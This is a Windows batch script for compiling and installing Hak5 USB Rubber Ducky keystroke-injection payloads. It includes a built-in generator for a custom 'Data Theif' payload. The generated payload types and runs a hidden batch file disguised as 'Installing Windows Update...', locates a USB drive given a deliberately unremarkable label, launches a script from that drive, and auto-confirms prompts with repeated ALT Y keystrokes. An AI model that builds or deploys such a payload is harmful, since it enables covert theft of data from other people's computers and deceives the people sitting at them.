@echo off
:start
%~d0
CD %~dp0
set CD_original=%CD%
set Encoder_Version=2.6.3
set Encoder_Directory=Encoders\%Encoder_Version%
set Compiler_Version_No=2.1
set Compiler_Version=%Compiler_Version_No% - Build date: 10 February 2014, 19:50
set Introduction_Message=Easy duck script compiler by Lavanoid (Jack Davies).
Title = Hak5 Ducky Script Compiler Version: %Compiler_Version_No%
@echo %Introduction_Message%
@echo Compiler version: %Compiler_Version%
@echo Using encoder version: %Encoder_Version%
if not exist "%Encoder_Directory%" @echo Unable to locate the encoder directory "%Encoder_Directory%"!
if not exist "%Encoder_Directory%" pause >nul
if not exist "%Encoder_Directory%" exit
if not exist "%Encoder_Directory%\encoder.jar" @echo Unable to locate "%Encoder_Directory%\encoder.jar"!
if not exist "%Encoder_Directory%\encoder.jar" pause >nul
if not exist "%Encoder_Directory%\encoder.jar" exit
if not exist "%Encoder_Directory%\resources" @echo Unable to locate "%Encoder_Directory%\resources"!
if not exist "%Encoder_Directory%\resources" pause >nul
if not exist "%Encoder_Directory%\resources" exit
if not exist "Payloads" @echo Unable to find the directory "Payloads".
if not exist "Payloads" @echo Creating the directory...
if not exist "Payloads" mkdir "Payloads"
if not exist "Payloads" @echo Failed to create the directory "Payloads".
if not exist "Payloads" pause >nul
if not exist "Payloads" exit
CD "Payloads"
if "%CD%"=="%CD_original%" @echo Failed to change the current directory. Is "Payloads" a file?
if "%CD%"=="%CD_original%" pause >nul
if "%CD%"=="%CD_original%" exit
@echo -----------------------------------------------
dir /A:D /B
@echo -----------------------------------------------
:dir_entry
@echo Enter the directory name that contains the
@echo inject.txt file. Type "cust" to create a
@echo custom "Data Theif" payload.
set inject_directory=
set /p inject_directory=Dir: %=%
if "%inject_directory%"=="" goto dir_entry
CD "%CD_original%"
if "%inject_directory%"=="cust" goto create_custom_data_theif
if "%inject_directory%"=="CUST" goto create_custom_data_theif
if "%inject_directory%"=="Cust" goto create_custom_data_theif
if "%inject_directory%"=="cUST" goto create_custom_data_theif
if not exist "%CD%\Payloads\%inject_directory%" @echo Unable to locate "%CD%\Payloads\%inject_directory%"!
if not exist "%CD%\Payloads\%inject_directory%" goto dir_entry
set CD_original=%CD%
set inject_directory=Payloads\%inject_directory%
CD "%inject_directory%"
if "%CD%"=="%CD_original%" @echo Failed to change the current directory. Is "Payloads" a file?
if "%CD%"=="%CD_original%" goto dir_entry
set inject_directory=%CD%
CD "%CD_original%"
if not exist "%inject_directory%\inject.txt" @echo Unable to locate "%inject_directory%\inject.txt"!
if not exist "%inject_directory%\inject.txt" goto dir_entry
@echo Everything looks ok.
goto properties_config
:create_custom_data_theif
@echo What is the label/name of the "Backup" device?
set device_label=
set /p device_label=Label: %=%
if "%device_label%"=="" goto create_custom_data_theif
@echo OK! Generating payload txt file...
set custom_payload_name=
set custom_payload_name=Data_Theif_Custom_%DATE:/=-%
if "%custom_payload_name%"=="" @echo Failed to set the payload name.
if "%custom_payload_name%"=="" goto start
if exist "Payloads\%custom_payload_name%" goto create_custom_data_theif_name_generate
goto create_custom_data_theif_generate
:create_custom_data_theif_name_generate
set filename_count=0
:create_custom_data_theif_name_generate_start
set /a filename_count=%filename_count%+1
if exist "Payloads\%custom_payload_name%_%filename_count%" goto create_custom_data_theif_name_generate_start
set custom_payload_name=%custom_payload_name%_%filename_count%
set filename_count=
goto create_custom_data_theif_generate
:create_custom_data_theif_generate
mkdir "Payloads\%custom_payload_name%"
@echo DELAY 15000 > "Payloads\%custom_payload_name%\inject.txt"
@echo REM Author: Lavanoid Volcanic >> "Payloads\%custom_payload_name%\inject.txt"
@echo REM This script supports Windows XP as well as Vista and 7. >> "Payloads\%custom_payload_name%\inject.txt"
@echo REM I don't have Windows 8 (I really want it though) so I cant test it. >> "Payloads\%custom_payload_name%\inject.txt"
if not "%device_label%"=="DUCKY" @echo REM This Script looks for the drive named "%device_label%" because "DUCKY" is too exposing. >> "Payloads\%custom_payload_name%\inject.txt"
@echo GUI d >> "Payloads\%custom_payload_name%\inject.txt"
@echo DELAY 500 >> "Payloads\%custom_payload_name%\inject.txt"
@echo GUI r >> "Payloads\%custom_payload_name%\inject.txt"
@echo DELAY 1500 >> "Payloads\%custom_payload_name%\inject.txt"
@echo STRING notepad.exe>> "Payloads\%custom_payload_name%\inject.txt"
@echo DELAY 200 >> "Payloads\%custom_payload_name%\inject.txt"
@echo ENTER >> "Payloads\%custom_payload_name%\inject.txt"
@echo DELAY 1500 >> "Payloads\%custom_payload_name%\inject.txt"
@echo STRING @echo off >> "Payloads\%custom_payload_name%\inject.txt"
@echo DELAY 200 >> "Payloads\%custom_payload_name%\inject.txt"
@echo ENTER >> "Payloads\%custom_payload_name%\inject.txt"
@echo DELAY 200 >> "Payloads\%custom_payload_name%\inject.txt"
@echo STRING Ti>> "Payloads\%custom_payload_name%\inject.txt"
@echo DELAY 200 >> "Payloads\%custom_payload_name%\inject.txt"
@echo STRING tle = Installing Windows Update... >> "Payloads\%custom_payload_name%\inject.txt"
@echo DELAY 200 >> "Payloads\%custom_payload_name%\inject.txt"
@echo ENTER >> "Payloads\%custom_payload_name%\inject.txt"
@echo STRING @echo Installing Windows Update... >> "Payloads\%custom_payload_name%\inject.txt"
@echo DELAY 200 >> "Payloads\%custom_payload_name%\inject.txt"
@echo ENTER >> "Payloads\%custom_payload_name%\inject.txt"
@echo STRING set drive=>> "Payloads\%custom_payload_name%\inject.txt"
@echo DELAY 200 >> "Payloads\%custom_payload_name%\inject.txt"
@echo ENTER >> "Payloads\%custom_payload_name%\inject.txt"
@echo STRING COLOR F0 >> "Payloads\%custom_payload_name%\inject.txt"
@echo DELAY 200 >> "Payloads\%custom_payload_name%\inject.txt"
@echo ENTER >> "Payloads\%custom_payload_name%\inject.txt"
@echo STRING :start>> "Payloads\%custom_payload_name%\inject.txt"
@echo DELAY 200 >> "Payloads\%custom_payload_name%\inject.txt"
@echo ENTER >> "Payloads\%custom_payload_name%\inject.txt"
@echo STRING if not "%%LOCALAPPDATA%%"=="" goto win_new>> "Payloads\%custom_payload_name%\inject.txt"
@echo DELAY 200 >> "Payloads\%custom_payload_name%\inject.txt"
@echo ENTER >> "Payloads\%custom_payload_name%\inject.txt"
set percent_icon=%%%%
@echo STRING for /f "tokens=3 delims= " %percent_icon%A in ('echo list volume ^^^| diskpart ^^^| findstr "%device_label%"') do set drive=%percent_icon%A>> "Payloads\%custom_payload_name%\inject.txt"
@echo DELAY 200 >> "Payloads\%custom_payload_name%\inject.txt"
@echo ENTER >> "Payloads\%custom_payload_name%\inject.txt"
@echo STRING if "%%drive%%"=="" goto start>> "Payloads\%custom_payload_name%\inject.txt"
@echo DELAY 200 >> "Payloads\%custom_payload_name%\inject.txt"
@echo ENTER >> "Payloads\%custom_payload_name%\inject.txt"
@echo STRING set drive=%%drive%%:>> "Payloads\%custom_payload_name%\inject.txt"
@echo DELAY 200 >> "Payloads\%custom_payload_name%\inject.txt"
@echo ENTER >> "Payloads\%custom_payload_name%\inject.txt"
@echo STRING %%drive%%>> "Payloads\%custom_payload_name%\inject.txt"
@echo DELAY 200 >> "Payloads\%custom_payload_name%\inject.txt"
@echo ENTER >> "Payloads\%custom_payload_name%\inject.txt"
@echo STRING CD "Data">> "Payloads\%custom_payload_name%\inject.txt"
@echo DELAY 200 >> "Payloads\%custom_payload_name%\inject.txt"
@echo ENTER >> "Payloads\%custom_payload_name%\inject.txt"
@echo STRING "SCRIPT_EX.bat" "SP.bat">> "Payloads\%custom_payload_name%\inject.txt"
@echo DELAY 200 >> "Payloads\%custom_payload_name%\inject.txt"
@echo ENTER >> "Payloads\%custom_payload_name%\inject.txt"
@echo STRING EXIT >> "Payloads\%custom_payload_name%\inject.txt"
@echo DELAY 200 >> "Payloads\%custom_payload_name%\inject.txt"
@echo ENTER >> "Payloads\%custom_payload_name%\inject.txt"
@echo STRING :win_new>> "Payloads\%custom_payload_name%\inject.txt"
@echo DELAY 400 >> "Payloads\%custom_payload_name%\inject.txt"
@echo ENTER >> "Payloads\%custom_payload_name%\inject.txt"
@echo DELAY 400 >> "Payloads\%custom_payload_name%\inject.txt"
@echo STRING for /f %percent_icon%d in ('wmic volume get driveletter^^^, label ^^^| findstr "%device_label%"') do set drive=%percent_icon%d>> "Payloads\%custom_payload_name%\inject.txt"
@echo DELAY 200 >> "Payloads\%custom_payload_name%\inject.txt"
@echo ENTER >> "Payloads\%custom_payload_name%\inject.txt"
@echo STRING if "%%drive%%"=="" goto start>> "Payloads\%custom_payload_name%\inject.txt"
@echo DELAY 200 >> "Payloads\%custom_payload_name%\inject.txt"
@echo ENTER >> "Payloads\%custom_payload_name%\inject.txt"
@echo STRING %%drive%%>> "Payloads\%custom_payload_name%\inject.txt"
@echo DELAY 200 >> "Payloads\%custom_payload_name%\inject.txt"
@echo ENTER >> "Payloads\%custom_payload_name%\inject.txt"
@echo STRING CD "Data">> "Payloads\%custom_payload_name%\inject.txt"
@echo DELAY 200 >> "Payloads\%custom_payload_name%\inject.txt"
@echo ENTER >> "Payloads\%custom_payload_name%\inject.txt"
@echo STRING "SCRIPT_EX.bat" "SP.bat">> "Payloads\%custom_payload_name%\inject.txt"
@echo DELAY 200 >> "Payloads\%custom_payload_name%\inject.txt"
@echo ENTER >> "Payloads\%custom_payload_name%\inject.txt"
@echo STRING EXIT >> "Payloads\%custom_payload_name%\inject.txt"
@echo DELAY 200 >> "Payloads\%custom_payload_name%\inject.txt"
@echo ENTER >> "Payloads\%custom_payload_name%\inject.txt"
@echo CTRL S >> "Payloads\%custom_payload_name%\inject.txt"
@echo DELAY 1500 >> "Payloads\%custom_payload_name%\inject.txt"
@echo STRING %%TEMP%%\DS.bat >> "Payloads\%custom_payload_name%\inject.txt"
@echo DELAY 1000 >> "Payloads\%custom_payload_name%\inject.txt"
@echo ENTER >> "Payloads\%custom_payload_name%\inject.txt"
@echo DELAY 600 >> "Payloads\%custom_payload_name%\inject.txt"
@echo ALT Y >> "Payloads\%custom_payload_name%\inject.txt"
@echo DELAY 700 >> "Payloads\%custom_payload_name%\inject.txt"
@echo ALT F4 >> "Payloads\%custom_payload_name%\inject.txt"
@echo GUI r >> "Payloads\%custom_payload_name%\inject.txt"
@echo DELAY 1500 >> "Payloads\%custom_payload_name%\inject.txt"
@echo STRING %%TEMP%%\DS.bat >> "Payloads\%custom_payload_name%\inject.txt"
@echo ENTER >> "Payloads\%custom_payload_name%\inject.txt"
@echo DELAY 1000 >> "Payloads\%custom_payload_name%\inject.txt"
@echo ALT y >> "Payloads\%custom_payload_name%\inject.txt"
@echo DELAY 500 >> "Payloads\%custom_payload_name%\inject.txt"
@echo ALT y >> "Payloads\%custom_payload_name%\inject.txt"
@echo DELAY 500 >> "Payloads\%custom_payload_name%\inject.txt"
@echo ALT y >> "Payloads\%custom_payload_name%\inject.txt"
@echo DELAY 500 >> "Payloads\%custom_payload_name%\inject.txt"
@echo ALT y >> "Payloads\%custom_payload_name%\inject.txt"
@echo DELAY 500 >> "Payloads\%custom_payload_name%\inject.txt"
@echo ALT y >> "Payloads\%custom_payload_name%\inject.txt"
@echo DELAY 500 >> "Payloads\%custom_payload_name%\inject.txt"
@echo ALT y >> "Payloads\%custom_payload_name%\inject.txt"
@echo DELAY 500 >> "Payloads\%custom_payload_name%\inject.txt"
@echo ALT y >> "Payloads\%custom_payload_name%\inject.txt"
if exist "Payloads\%custom_payload_name%\inject.txt" @echo Successfully wrote "Payloads\%custom_payload_name%\inject.txt"!
set inject_directory=Payloads\%custom_payload_name%
set custom_payload_name=
set percent_icon=
:properties_config
cd "%Encoder_Directory%\resources"
@echo -----------------------------------------------
DIR /B
@echo -----------------------------------------------
@echo Enter the name of the keyboard properties file.
@echo You do not need to include ".properties" but you can if you want to.
set kpropertiesfile=
set /p kpropertiesfile=File: %=%
if "%kpropertiesfile%"=="" goto properties_config
if not exist "%kpropertiesfile%" set kpropertiesfile=%kpropertiesfile%.properties
if not exist "%kpropertiesfile%" @echo Unable to locate "%kpropertiesfile%"!
if not exist "%kpropertiesfile%" goto properties_config
CD "%CD_original%"
if exist "%inject_directory%\inject.bin" @echo Old inject.bin located. Deleting...
if exist "%inject_directory%\inject.bin" del /f "%inject_directory%\inject.bin"
if exist "%inject_directory%\inject.bin" @echo Failed to remove "%inject_directory%\inject.bin"!
if exist "%inject_directory%\inject.bin" goto dir_entry
java -jar "%Encoder_Directory%\encoder.jar"  -l "%Encoder_Directory%\resources\%kpropertiesfile%" -i "%inject_directory%\inject.txt" -o "%inject_directory%\inject.bin"
if exist "%inject_directory%\inject.bin" @echo Successfully compiled "%inject_directory%\inject.bin"!
if not exist "%inject_directory%\inject.bin" @echo Failed to compile "%inject_directory%\inject.bin"!
if not exist "%inject_directory%\inject.bin" goto end 
if "%~d0"=="%SystemDrive%" goto start
@echo Install?
@echo Source: "%inject_directory%\inject.bin"
@echo Location: "%~d0\inject.bin"
set install_option=
set /p install_option=Y/N: %=%
if "%install_option%"=="y" goto install
if "%install_option%"=="Y" goto install
goto start
:install
@echo Installing inject.bin...
if exist "%~d0\inject.bin" del /f "%~d0\inject.bin" >nul
if exist "%~d0\inject.bin" @echo Unable to remove "%~d0\inject.bin"!
if exist "%~d0\inject.bin" goto end
copy /y "%inject_directory%\inject.bin" "%~d0\inject.bin" >nul
if exist "%~d0\inject.bin" @echo Successfully installed the inject file.
if exist "%~d0\inject.bin" @echo LETS GET QUACKING!
:end
pause >nul
goto start